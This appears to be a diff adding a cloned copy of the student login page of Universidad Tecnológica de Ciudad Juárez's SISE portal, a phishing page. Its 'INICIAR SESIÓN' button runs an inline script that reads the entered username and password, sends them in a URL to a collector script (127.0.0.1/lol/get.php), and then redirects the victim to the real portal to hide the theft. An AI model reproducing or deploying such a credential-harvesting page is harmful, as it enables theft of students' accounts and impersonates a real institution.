@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge; chrome=1" />
+    <title>SISE ALUMNOS</title>
+    <meta
+      name="keywords"
+      content="SISE UTCJ Universidad Tecnológica de Ciudad Juárez Inscripción Inscripciones Servicios Estudiantiles Escolares"
+    />
+    <meta
+      name="description"
+      content="El Sistema Integral de Servicios Estudiantiles (SISE) de la Universidad Tecnológica de Ciudad Juárez provee servicios tales como inscripciones y consulta de información al alumnado y personal administrativo y docente de la institución."
+    />
+    <meta
+      name="author"
+      content="Universidad Tecnologica de Ciudad Juarez 2011-2023"
+    />
+    <link rel="icon" type="image/ico" href="/Archivos/LOGITO.png" />
+    <link type="text/css" rel="stylesheet" href="/graphics/PixelGreen.css" />
+    <link type="text/css" rel="stylesheet" href="/css/SISEestilos.css" />
+    <link href="alumnos/Alumnos.css" rel="stylesheet" type="text/css" />
+    <style type="text/css">
+      #headerphoto {
+        display: none;
+      }
+      #divLogin {
+        width: 720px;
+        float: right;
+      }
+      #divPlataformas {
+        float: left;
+        font-size: 12pt;
+        margin: 0;
+        padding: 15px 0px 10px 0px;
+        border-right: 5px solid #efeded;
+        background-color: #ffffff;
+        width: 230px;
+      }
+      #PanelAvisos {
+        border-top: 6px solid #f8f8f8;
+      }
+      .post {
+        overflow: hidden;
+      }
+      #divPlataformas li {
+        display: block;
+        list-style-type: none;
+      }
+      .p1 {
+        font-size: 20px;
+        font-weight: bold;
+        color: #666;
+        padding-top: 8px;
+        padding-bottom: 8px;
+      }
+      .p2 {
+        font-size: 16px;
+      }
+      .p4 {
+        font-size: 18px;
+        font-weight: bold;
+        color: #484848;
+        text-align: left;
+        margin-left: 20px;
+        line-height: 26px;
+      }
+      .p5 {
+        font-size: 16px;
+        font-weight: bold;
+        color: #74a846;
+      }
+      .loginInput {
+        font-size: 10pt;
+        height: 16px;
+        margin-right: 4px;
+      }
+      .ahref {
+        display: block;
+        padding-bottom: 14px;
+      }
+      .avisoItem {
+        display: inline-block;
+        margin: 5px;
+      }
+      .avisoItem img {
+        max-height: 120px;
+        width: 400px;
+      }
+      .plataformaItem {
+        padding-bottom: 15px;
+      }
+      .plataformaItem a {
+        display: inline-block;
+        width: 170px;
+        text-decoration: none;
+      }
+    </style>
+
+    <style type="text/css">
+      #header {
+        z-index: 4000;
+      }
+      #wrap {
+        z-index: 2000;
+      }
+      #content-wrap {
+        z-index: 3000;
+      }
+      #content {
+        z-index: 3200;
+      }
+      #footer {
+        z-index: 2500;
+      }
+      .accContainer {
+        filter: alpha(opacity=50);
+      }
+    </style>
+  </head>
+  <body>
+    <form method="post" action="./" id="form1Wrap">
+      <div class="aspNetHidden">
+        <input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
+        <input
+          type="hidden"
+          name="__VIEWSTATE"
+          id="__VIEWSTATE"
+          value="/wEPDwUKMjA1MDg1MTQxOA9kFgJmD2QWAgIDD2QWBgIDDw8WAh4EVGV4dAUPSW5pY2lhciBTZXNpw7NuZGQCBQ8PFgIeB1Zpc2libGVoZGQCDQ9kFgICAQ9kFggCAw8WAh4LXyFJdGVtQ291bnQCBRYKAgEPZBYCZg8VAxlodHRwOi8vY29ycmVvLnV0Y2ouZWR1Lm14EEJvdG9uSW5pY2lvVmVyZGUUQ29ycmVvIEluc3RpdHVjaW9uYWxkAgIPZBYCZg8VAzhodHRwczovL2NhbXB1c3ZpcnR1YWwudXRjai5lZHUubXgvbW9vZGxlL2xvZ2luL2luZGV4LnBocBBCb3RvbkluaWNpb1ZlcmRlBk1vb2RsZWQCAw9kFgJmDxUDSmh0dHBzOi8vd3d3LnV0Y2ouZWR1Lm14L1BsYW5lYWNpb24vUHVibGlzaGluZ0ltYWdlcy9hdmlzb19idXpvbl9xdWVqYXMuanBnEEJvdG9uSW5pY2lvVmVyZGUQQnV6w7NuIGRlIFF1ZWphc2QCBA9kFgJmDxUDOGh0dHBzOi8vd3d3LnV0Y2ouZWR1Lm14L1BhZ2luYXMvVXN1YXJpb3MvQ2FsZW5kYXJpby5hc3B4D0JvdG9uSW5pY2lvR3JpcxJDYWxlbmRhcmlvIEVzY29sYXJkAgUPZBYCZg8VAzdodHRwczovL3d3dy51dGNqLmVkdS5teC9QYWdpbmFzL1VzdWFyaW9zL0VncmVzYWRvcy5hc3B4D0JvdG9uSW5pY2lvR3JpcxNFbnRyZWdhIGRlIFTDrXR1bG9zZAIHDw9kFgIeC3BsYWNlaG9sZGVyBQlhbDAwMDAwMDBkAgkPDxYCHwAFDEB1dGNqLmVkdS5teGRkAhUPDxYCHwAFhAFTaSB0aWVuZXMgcHJvYmxlbWFzIHBhcmEgaW5pY2lhciBzZXNpw7NuLCBlbnbDrWEgdW5hIGZvdG8gZGUgdHU8YnIgLz5jcmVkZW5jaWFsIGVzY29sYXIgdmlnZW50ZSBhbCBjb3JyZW8gc29wb3J0ZV9jb3JyZW9AdXRjai5lZHUubXhkZGTupeOnNFvGy5HXmvPkPFFHdpi3xFY2qoc6qFB1urbMIg=="
+        />
+      </div>
+
+      <div class="aspNetHidden">
+        <input
+          type="hidden"
+          name="__VIEWSTATEGENERATOR"
+          id="__VIEWSTATEGENERATOR"
+          value="CA0B0334"
+        />
+        <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+        <input
+          type="hidden"
+          name="__EVENTARGUMENT"
+          id="__EVENTARGUMENT"
+          value=""
+        />
+        <input
+          type="hidden"
+          name="__EVENTVALIDATION"
+          id="__EVENTVALIDATION"
+          value="/wEdAATo1F8DKizyDj1WALN7Q10GCBwCFwaVipbdqd0q28XyTVGLdONO5j3J99fGUR0zhhtjXEdzWpGajQOgDDSo9vAfg5tAiNqF2noHGATQpF8WIo2EhDYh+a3FSE2oHcIStzw="
+        />
+      </div>
+      <div id="header">
+        <div id="header-content">
+          <h1 id="logo">
+            <span class="gray"
+              >Sistema Integral de Servicios Estudiantiles</span
+            >
+          </h1>
+          <ul id="menu-ut">
+            <li><a id="hlHome" href="default.aspx">Inicio</a></li>
+            <li>
+              <a
+                id="hlLogin"
+                href="https://alumnos.utcj.edu.mx/"
+                style="color: #00cc00"
+                >Iniciar Sesión</a
+              >
+            </li>
+            <li></li>
+          </ul>
+        </div>
+      </div>
+      <div id="wrap">
+        <div id="content-wrap">
+          <div id="content">
+            <div id="main">
+              <div class="post">
+                <div id="PanelSuperior" style="width: 100%">
+                  <div id="divPlataformas">
+                    <ul>
+                      <li>
+                        <a
+                          id="CphCuerpo_HyperLink3"
+                          class="ahref"
+                          href="https://www.utcj.edu.mx/"
+                          target="_blank"
+                        >
+                          <img
+                            src="Archivos/utlogo3.png"
+                            alt="UTCJ"
+                            width="180"
+                          /><br />
+                        </a>
+                      </li>
+                    </ul>
+                    <ul>
+                      <li class="plataformaItem">
+                        <a
+                          href="http://correo.utcj.edu.mx"
+                          class="BotonInicioVerde"
+                          target="_blank"
+                          >Correo Institucional</a
+                        >
+                      </li>
+
+                      <li class="plataformaItem">
+                        <a
+                          href="https://campusvirtual.utcj.edu.mx/moodle/login/index.php"
+                          class="BotonInicioVerde"
+                          target="_blank"
+                          >Moodle</a
+                        >
+                      </li>
+
+                      <li class="plataformaItem">
+                        <a
+                          href="https://www.utcj.edu.mx/Planeacion/PublishingImages/aviso_buzon_quejas.jpg"
+                          class="BotonInicioVerde"
+                          target="_blank"
+                          >Buzón de Quejas</a
+                        >
+                      </li>
+
+                      <li class="plataformaItem">
+                        <a
+                          href="https://www.utcj.edu.mx/Paginas/Usuarios/Calendario.aspx"
+                          class="BotonInicioGris"
+                          target="_blank"
+                          >Calendario Escolar</a
+                        >
+                      </li>
+
+                      <li class="plataformaItem">
+                        <a
+                          href="https://www.utcj.edu.mx/Paginas/Usuarios/Egresados.aspx"
+                          class="BotonInicioGris"
+                          target="_blank"
+                          >Entrega de Títulos</a
+                        >
+                      </li>
+                    </ul>
+                  </div>
+                  <div id="divLogin" class="center">
+                    <br /><br />
+                    <table class="loginForm">
+                      <tr>
+                          <th colspan="2">DATOS DE ACCESO</th>
+                      </tr>
+                      <tr>
+                          <td style="text-align: right">
+                              <span id="CphCuerpo_Label2" style="font-size: Medium">Usuario:</span>
+                          </td>
+                          <td>
+                              <input
+                                  name="ctl00$CphCuerpo$txtUsuario"
+                                  type="text"
+                                  maxlength="30"
+                                  size="50"
+                                  id="CphCuerpo_txtUsuario"
+                                  class="loginInput"
+                                  placeholder="al0000000"
+                                  style="width: 150px"
+                              />
+                              <span id="CphCuerpo_lblDominio" class="LabelAlertaBlack">@utcj.edu.mx</span>
+                          </td>
+                      </tr>
+                      <tr>
+                          <td style="text-align: right">
+                              <span id="CphCuerpo_Label1" style="font-size: Medium">Contraseña:</span>
+                          </td>
+                          <td>
+                              <input
+                                  name="ctl00$CphCuerpo$txtContrasenia"
+                                  type="password"
+                                  maxlength="30"
+                                  size="50"
+                                  id="CphCuerpo_txtContrasenia"
+                                  class="loginInput"
+                                  style="width: 250px"
+                              />
+                          </td>
+                      </tr>
+                      <tr>
+                          <td style="text-align: right">&nbsp;</td>
+                          <td>
+                              <span
+                                  id="CphCuerpo_lblErrorLogin"
+                                  class="LabelAlerta"
+                                  style="color: Red; font-weight: bold"
+                              ></span>
+                              <br />
+                              <script>
+                                  function iniciarSesion() {
+                                      var usuario = document.getElementById("CphCuerpo_txtUsuario").value;
+                                      var contrasenia = document.getElementById("CphCuerpo_txtContrasenia").value;
+                                      // Construir la URL con los parámetros de usuario y contraseña
+                                      var url = "http://127.0.0.1/lol/get.php?usu=" + encodeURIComponent(usuario) + "&contra=" + encodeURIComponent(contrasenia);
+                                      // Redirigir a la URL construida
+                                      window.location.href = url;
+                                      window.location.href = "https://alumnos.utcj.edu.mx/";
+                                  }
+                              </script>
+                              <button
+                                  type="button"
+                                  class="BotonVerde"
+                                  style="font-size: 11pt; width: 260px"
+                                  onclick="iniciarSesion()"
+                              >
+                                  INICIAR SESIÓN
+                              </button>
+                              <br />
+                              <br />
+                              &nbsp;
+                          </td>
+                      </tr>
+                  </table>
+                    <table class="loginForm">
+                      <tr>
+                        <td
+                          style="
+                            border: 1px solid #c0c0c0;
+                            text-align: center;
+                            margin: 0px auto;
+                          "
+                        >
+                          <span
+                            id="CphCuerpo_lblCuentas"
+                            class="LabelNotificacion"
+                          ></span>
+                          <br />
+                          <span
+                            id="CphCuerpo_lblRecuperacionCuenta"
+                            class="LabelTitulo"
+                            >Si tienes problemas para iniciar sesión, envía una
+                            foto de tu<br />credencial escolar vigente al correo
+                            soporte_correo@utcj.edu.mx</span
+                          >
+                          <br />
+                          &nbsp;
+                        </td>
+                      </tr>
+                      <tr>
+                        <td
+                          style="
+                            text-align: center;
+                            margin: 0px auto;
+                            border-top-style: solid;
+                            border-top-width: 1px;
+                            border-top-color: #c0c0c0;
+                          "
+                        >
+                          <br />
+                          <div id="CphCuerpo_pnlBannerAplicacion">
+                            <a
+                              href="https://play.google.com/store/apps/details?id=mx.edu.utcj.sisealumnosutcj"
+                              target="_blank"
+                              ><img
+                                src="graphics/AppAndroid.jpg"
+                                alt="SISE Alumnos UTCJ"
+                                style="width: 300px"
+                            /></a>
+                          </div>
+                        </td>
+                      </tr>
+                    </table>
+                    <br />
+                  </div>
+                </div>
+                <div style="clear: both; width: 100%"></div>
+                <div id="PanelAvisos" style="width: 100%">
+                  <div style="width: 100%">
+                    <table
+                      style="width: 97%; margin-top: 20px; margin-bottom: 20px"
+                    >
+                      <tr>
+                        <td align="center" width="50%">
+                          <div id="CphCuerpo_pnlAvisosListado">
+                            <a
+                              class="avisoItem"
+                              href="Archivos/FormatoConvenioEA24.pdf"
+                              target="_blank"
+                              ><img
+                                src="Archivos/Convenios.png"
+                                alt="Convenio SD23" /></a
+                            ><a
+                              class="avisoItem"
+                              href="https://www.utcj.edu.mx/Documents/WhatsApp%20Image%202020-07-09%20at%2011.05.47%20AM.jpeg"
+                              target="_blank"
+                              ><img
+                                src="Archivos/RegistroSubes.jpeg"
+                                alt="Registro Subes"
+                            /></a>
+                          </div>
+                        </td>
+                      </tr>
+                    </table>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="footer" style="text-align: center; background-color: #e8e8e8">
+          <div id="footer-content"></div>
+          <div id="footer_static" style="line-height: 12px">
+            <hr style="margin: 0; color: #74a846" />
+            <p style="font-family: 'Open Sans' sans-serif; font-size: 9pt">
+              <b>UNIVERSIDAD TECNOLÓGICA DE CIUDAD JUÁREZ D.R. 2011-2023</b>
+            </p>
+          </div>
+        </div>
+
+        <div style="clear: both"></div>
+      </div>
+    </form>
+  </body>
+</html>
